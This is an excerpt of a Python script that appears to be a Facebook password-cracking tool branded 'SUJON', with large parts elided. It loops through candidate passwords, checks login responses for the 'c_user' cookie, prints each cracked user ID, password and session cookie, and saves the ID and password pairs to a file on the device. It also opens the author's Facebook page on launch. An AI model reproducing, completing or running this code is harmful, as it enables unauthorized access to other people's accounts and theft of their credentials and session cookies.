...
ha = current.day
today = date.today()
os.system('xdg-open https://www.facebook.com/sujonbevies/')
logo =("""\033[0;92m

 d8888. db    db    d88b  .d88b.  d8b   db 
88'  YP 88    88    `8P' .8P  Y8. 888o  88 
`8bo.   88    88     88  88    88 88V8o 88 
  `Y8b. 88    88     88  88    88 88 V8o88 
db   8D 88b  d88 db. 88  `8b  d8' 88  V888 
`8888Y' ~Y8888P' Y8888P   `Y88P'  VP   V8P                                                                   \/____/         
        ...
        for ps in pwx:
           ...
           'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[SUJON😈] \033[1;32m'+uid+'\033[1;32m • \033[1;32m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                ...
                open('/sdcard/Sujon-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}Sujon[😈]{x}][%s\%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
